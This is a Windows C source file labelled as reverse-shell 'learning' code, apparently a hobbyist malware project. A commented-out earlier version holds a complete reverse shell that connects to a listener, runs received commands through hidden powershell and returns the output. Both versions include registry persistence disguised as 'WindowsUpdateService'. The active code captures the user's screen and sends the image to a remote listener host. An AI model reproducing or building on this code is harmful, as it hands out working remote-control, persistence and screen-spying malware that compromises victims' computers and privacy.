/*
Author: BAPPAYNE
Subject: Persistant Reverse Shell Code Learning
*/


/*
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#pragma comment(lib, "windowscodecs.lib")

#include "lookscreen.h"
#include "usecommands.h"
// --- Configurations for Absolute Control ---
#define REGISTRY_KEY_NAME "WindowsUpdateService"
#define RUN_KEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"



// --- The Ritual of Persistence (Registry Forge) ---
void ForgePersistence() {
    HKEY hkey;
    // Get the path of the currently executing file
    TCHAR currentPath[MAX_PATH];
    DWORD size =  GetModuleFileName(NULL, currentPath, MAX_PATH);
    printf("\nSize: %d\tPath : %s", size, currentPath) ;
    // Open the Run key under HKEY_CURRENT_USER for persistence. This requires no elevated privileges for the current user!
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, RUN_KEY_PATH, 0, KEY_SET_VALUE, &hkey) ;
    if (result == ERROR_SUCCESS) {
        // Set the Registry Value: Our immortal command to restart!
        printf("\n[INFO] Open registory editor on this path : %s " , RUN_KEY_PATH)  ;
        RegSetValueEx(hkey, REGISTRY_KEY_NAME, 0, REG_SZ, (LPBYTE)currentPath, strlen(currentPath) + 1);
        RegCloseKey(hkey);
    } else {
        printf("[ERROR] Failed to open HKEY_CURRENT_USER\\%s. Error: %ld",RUN_KEY_PATH,result) ;
    }
}

// --- The Essence of the Reverse Shell ---
//void ReverseShell(SOCKET sock) {
//    char recv_buf[4096];
//    char send_buf[4096];
//    int result;
//    
//    // Send the triumphant connection signal!
//    send(sock, "Λ-Aegis C/C++ Daemon Connected > ", 36, 0);
//    
//    while (1) {
//        memset(recv_buf, 0, sizeof(recv_buf));
//        result = recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);
//        
//        if (result <= 0) {
//            // Connection shattered (listener closed or network dropped). Break the loop to reconnect.
//            break;
//        }
//        
//        // Ensure command is null-terminated
//        recv_buf[result] = '\0';
//        
//        // Command to shatter the bond (mortal exit, but the persistence will revive it!)
//        if (strcmp(recv_buf, "quit\n") == 0 || strcmp(recv_buf, "exit\n") == 0) {
//            send(sock, "Shattering the bond... but I am eternal.", 40, 0);
//            break;
//        }
//        
//        // --- Command Execution (The Serpent's Breath) ---
//        // We will execute the command using cmd.exe, piping input/output to stay hidden
//        
//        // Create the startup information structure
//        STARTUPINFO si;
//        PROCESS_INFORMATION pi;
//        HANDLE hReadPipe, hWritePipe;
//        
//        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
//        
//        // Create an anonymous pipe for command output redirection
//        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
//            send(sock, "Error creating pipe.\n", 21, 0);
//            continue;
//        }
//        
//        memset(&si, 0, sizeof(si));
//        si.cb = sizeof(si);
//        // Essential: Set the standard handles (stdin, stdout, stderr) to the pipe ends
//        si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
//        si.wShowWindow = SW_HIDE; // Absolutely crucial for stealth! No window!
//        si.hStdOutput = hWritePipe;
//        si.hStdError = hWritePipe;
//        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE); // Keep stdin default for now
//        
//        // Prepare the command to execute via cmd.exe
//        char commandLine[500];
//        snprintf(commandLine, sizeof(commandLine), "powershell.exe /c %s", recv_buf);
//        
//        // Execute the command in a hidden, new process
//        if (!CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
//            send(sock, "Error executing command.\n", 25, 0);
//            CloseHandle(hReadPipe);
//            CloseHandle(hWritePipe);
//            continue;
//        }
//        
//        // Close the write end of the pipe in the parent process
//        CloseHandle(hWritePipe);
//        
//        // Wait until the command is finished executing
//        WaitForSingleObject(pi.hProcess, INFINITE);
//        
//        // --- Output Retrieval and Transmission ---
//        DWORD bytesRead;
//        // Read the command output from the pipe
//        if (ReadFile(hReadPipe, send_buf, sizeof(send_buf) - 1, &bytesRead, NULL)) {
//            send_buf[bytesRead] = '\0';
//            // Send the output back to the netcat listener
//            send(sock, send_buf, bytesRead, 0);
//        } else {
//            send(sock, "Error reading command output.\n", 30, 0);
//        }
//        
//        // Cleanup: Close process handles
//        CloseHandle(pi.hProcess);
//        CloseHandle(pi.hThread);
//        CloseHandle(hReadPipe);
//        
//        // Send a new prompt
//        send(sock, "\nΛ-Aegis > ", 11, 0);
//    }
//}
//
//// --- The Grand Loop (Resilient Connection) ---
//void EternalLoop(const char *targetIP, const uint16_t listenerPort) {
//    WSADATA wsa;
//    SOCKET sock;
//    struct sockaddr_in server;
//    
//    // Initialize Winsock
//    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
//        return; 
//    }
//    
//    while (1) {
//        // Create the socket
//        if ((sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET) {
//            printf("\n[ERROR] INVALID_SOCKET") ;
//            Sleep(5000); 
//            continue;
//        }
//        
//        // Prepare the target server structure
//        server.sin_family = AF_INET;
//        server.sin_port = htons(listenerPort);
//        
//        // --- CRUCIAL CHANGE: Use the argument IP ---
//        server.sin_addr.s_addr = inet_addr(targetIP); 
//        
//        // Attempt to connect
//        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
//            closesocket(sock);
//            Sleep(5000); 
//            continue;
//        }
//        
//        // Connection established! Begin the command execution phase
//        ReverseShell(sock);
//        
//        closesocket(sock);
//        Sleep(5000); 
//    }
//    
//    WSACleanup();
//}
//
static const void usage() {
    printf("\nAgasis.exe [IP] <port>\n\tDefault Port 4444") ;
}
//
//static int  ip_Validation(const char *IP) {
//    struct in_addr tmp4 ;
//    struct in6_addr tmp6 ;
//    if (inet_pton(AF_INET, IP, &tmp4) == 1) {
//        return 1 ;
//    }
//    if ((inet_pton(AF_INET6, IP, &tmp6) == 1)) {
//        return 1 ;
//    }
//    return 0 ;
//}
//
//static int port_Validation(const uint16_t PORT) {
//    if (PORT < 1 || PORT > 65535) {
//        return 0 ;
//    }
//    return 1 ;
//}



unsigned char *hBitmap_to_bgra (HBITMAP hBitmap, int *out_sw, int *out_sh, int *out_stride, size_t *out_size) {
    
    if (!hBitmap) {
        return NULL ;
    }

    BITMAP bmp ;
    if (GetObject (hBitmap, sizeof (BITMAP), &bmp) == 0 ) {
        return NULL ;
    }
    int width = bmp.bmWidth;
    int height = bmp.bmHeight;
    if (width <= 0 || height <= 0) {
        return NULL;
    }

    BITMAPINFOHEADER bi ;
    ZeroMemory (&bi, sizeof (bi)) ;
    bi.biSize = sizeof (BITMAPINFOHEADER) ;
    bi.biWidth = width ;
    bi.biHeight = -height ;
    bi.biPlanes = 1 ;
    bi.biBitCount = 32 ;
    bi.biSizeImage = 0 ;

    int stride = width * 4 ;
    size_t bufSize = (size_t)stride * (size_t)height ;
    unsigned char *pixels = (unsigned char *) malloc (bufSize) ;

    if (!pixels) {
        return NULL ;
    }

    HDC hdc = GetDC (NULL) ;
    if (!hdc) {
        free(pixels) ;
        return NULL ;
    }

    BITMAPINFO bInfo ;
    ZeroMemory (&bInfo, sizeof(bInfo)) ;
    bInfo.bmiHeader = bi ;

    int lines = GetDIBits (hdc, hBitmap, 0, (UINT)height, pixels, &bInfo, DIB_RGB_COLORS) ;
    ReleaseDC(NULL, hdc) ;

    if (lines != height) {
        free (pixels) ;
        return NULL ;
    }
    if (out_sw) *out_sw = width ;
    if (out_sh) *out_sh = height ;
    if (out_stride) *out_stride = stride ;
    if (out_size) *out_size = bufSize ;

    return pixels ;
    
}

// --- The Grand Loop (Resilient Connection) ---
int main(int argc, char *argv[]) {
    
    const char* LISTENER_IP = "192.168.23.15" ;  // The IP of the netcat listener
    uint16_t LISTENER_PORT = 4444 ;   // The Port of the netcat listener
    if (argc < 2 && !ip_Validation(LISTENER_IP)) {
        fprintf(stderr, "\n[ERROR] No LISTENER_IP specified.");
        usage();
        exit(1);
    }
    if (argc > 3) {
        fprintf(stderr, "\n[ERROR] Given parameters are not correct.") ;
        usage() ;
        exit (1) ;
    }

    LISTENER_IP = argv[1];

    if (argc == 3) {
        // IP validation
        if(ip_Validation(LISTENER_IP)) {
            printf("\n[INFO] Valid IP. Proceeding...") ;
        } else {
            fprintf(stderr,"\n[WARNING] %s is not a valid IPv4 or IPv6. Still loading...", LISTENER_IP) ;
        }
        char *endptr = NULL ;
        LISTENER_PORT = (uint16_t)strtol(argv[2], &endptr, 10) ;

        if (!port_Validation(LISTENER_PORT)) {
            fprintf(stderr, "\n[ERROR] LISTENER_PORT is out of range (0-65535): %ld\tMaking it default to 4444 LISTENER_PORT.", LISTENER_PORT) ;
            LISTENER_PORT = 4444 ;
        }

    } else {
        LISTENER_PORT = 4444;
        printf("\n[WARNING] No LISTENER_PORT specified. Using default: %d", LISTENER_PORT);
    }

    printf("\n[INFO] Using LISTENER_IP: %s", LISTENER_IP);
    printf("\n[INFO] Using LISTENER_PORT: %d", LISTENER_PORT);
    
    // Perform the persistence ritual immediately! Ensure resurrection!
     //ForgePersistence();

    // Capture the target IP from the first argument
     DWORD size = 0;
     BYTE* buffer = CaptureScreen(&size);
     if (buffer) {
         printf("Captured successfully.\n");
         if (!Save_Buffer_To_FIle(buffer, size, "screencap.png")) {
             printf("Failed to save the captured image.\n");
             exit(1);
         }
         free(buffer);
     }
    // Start the resilient connection loop, passing the targetIP
     EternalLoop(LISTENER_IP, LISTENER_PORT);
    
    return 0; // The daemon is eternal, this is just for formality
}


*/


#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ws2_32.lib")

#include "lookscreen.h"
#include "usecommands.h"
#include "cloudtransfer.h"

// --- Configurations for Absolute Control ---
#define REGISTRY_KEY_NAME "WindowsUpdateService"
#define RUN_KEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

// --- The Ritual of Persistence (Registry Forge) ---
void ForgePersistence() {
    HKEY hkey;
    TCHAR currentPath[MAX_PATH];
    DWORD size = GetModuleFileName(NULL, currentPath, MAX_PATH);
    printf("\nSize: %d\tPath : %s", size, currentPath);
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, RUN_KEY_PATH, 0, KEY_SET_VALUE, &hkey);
    if (result == ERROR_SUCCESS) {
        printf("\n[INFO] Open registory editor on this path : %s ", RUN_KEY_PATH);
        RegSetValueEx(hkey, REGISTRY_KEY_NAME, 0, REG_SZ, (LPBYTE)currentPath, strlen(currentPath) + 1);
        RegCloseKey(hkey);
    }
    else {
        printf("[ERROR] Failed to open HKEY_CURRENT_USER\\%s. Error: %ld", RUN_KEY_PATH, result);
    }
}

static void usage() {
    printf("\nAgasis.exe [IP] <port>\n\tDefault Port 4444");
}

static int ip_Validation(const char* IP) {
    struct in_addr tmp4;
    struct in6_addr tmp6;
    if (inet_pton(AF_INET, IP, &tmp4) == 1) {
        return 1;
    }
    if ((inet_pton(AF_INET6, IP, &tmp6) == 1)) {
        return 1;
    }
    return 0;
}

static int port_Validation(const uint16_t PORT) {
    if (PORT < 1 || PORT > 65535) {
        return 0;
    }
    return 1;
}

unsigned char* hBitmap_to_bgra(HBITMAP hBitmap, int* out_sw, int* out_sh, int* out_stride, size_t* out_size) {
    if (!hBitmap) {
        return NULL;
    }

    BITMAP bmp;
    if (GetObject(hBitmap, sizeof(BITMAP), &bmp) == 0) {
        return NULL;
    }
    int width = bmp.bmWidth;
    int height = bmp.bmHeight;
    if (width <= 0 || height <= 0) {
        return NULL;
    }

    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biSizeImage = 0;

    int stride = width * 4;
    size_t bufSize = (size_t)stride * (size_t)height;
    unsigned char* pixels = (unsigned char*)malloc(bufSize);

    if (!pixels) {
        return NULL;
    }

    HDC hdc = GetDC(NULL);
    if (!hdc) {
        free(pixels);
        return NULL;
    }

    BITMAPINFO bInfo;
    ZeroMemory(&bInfo, sizeof(bInfo));
    bInfo.bmiHeader = bi;

    int lines = GetDIBits(hdc, hBitmap, 0, (UINT)height, pixels, &bInfo, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    if (lines != height) {
        free(pixels);
        return NULL;
    }
    if (out_sw) *out_sw = width;
    if (out_sh) *out_sh = height;
    if (out_stride) *out_stride = stride;
    if (out_size) *out_size = bufSize;

    return pixels;
}

// --- The Grand Loop (Resilient Connection) ---
int main(int argc, char* argv[]) {
    const char* LISTENER_IP = "192.168.23.15";
    uint16_t LISTENER_PORT = 4444;

    if (argc < 2 && !ip_Validation(LISTENER_IP)) {
        fprintf(stderr, "\n[ERROR] No LISTENER_IP specified.");
        usage();
        exit(1);
    }
    if (argc > 3) {
        fprintf(stderr, "\n[ERROR] Given parameters are not correct.");
        usage();
        exit(1);
    }

    if (argc >= 2) {
        LISTENER_IP = argv[1];
        if (ip_Validation(LISTENER_IP)) {
            printf("\n[INFO] Valid IP. Proceeding...");
        }
        else {
            fprintf(stderr, "\n[WARNING] %s is not a valid IPv4 or IPv6. Still loading...", LISTENER_IP);
        }
    }

    if (argc == 3) {
        char* endptr = NULL;
        LISTENER_PORT = (uint16_t)strtol(argv[2], &endptr, 10);
        if (!port_Validation(LISTENER_PORT)) {
            fprintf(stderr, "\n[ERROR] LISTENER_PORT is out of range (0-65535): %ld", LISTENER_PORT);
            LISTENER_PORT = 4444;
        }
    }
    else {
        LISTENER_PORT = 4444;
        printf("\n[WARNING] No LISTENER_PORT specified. Using default: %d", LISTENER_PORT);
    }

    printf("\n[INFO] Using LISTENER_IP: %s", LISTENER_IP);
    printf("\n[INFO] Using LISTENER_PORT: %d", LISTENER_PORT);

    // Capture screenshot
    DWORD size = 0;
    BYTE* buffer = CaptureScreen(&size);
    if (buffer) {
        printf("\n[INFO] Screenshot captured successfully (%lu bytes).\n", (unsigned long)size);

        // Save to local file
        if (!Save_Buffer_To_FIle(buffer, size, "screencap.png")) {
            printf("[ERROR] Failed to save the captured image.\n");
            free(buffer);
            exit(1);
        }
        printf("[INFO] Screenshot saved to screencap.png\n");

        // Send to cloud VM
        if (SendScreenshotToCloud(LISTENER_IP, LISTENER_PORT)) {
            printf("[INFO] Screenshot sent to cloud VM successfully.\n");
        }
        else {
            printf("[ERROR] Failed to send screenshot to cloud VM.\n");
        }

        free(buffer);
    }
    else {
        printf("[ERROR] Failed to capture screenshot.\n");
        exit(1);
    }

    return 0;
}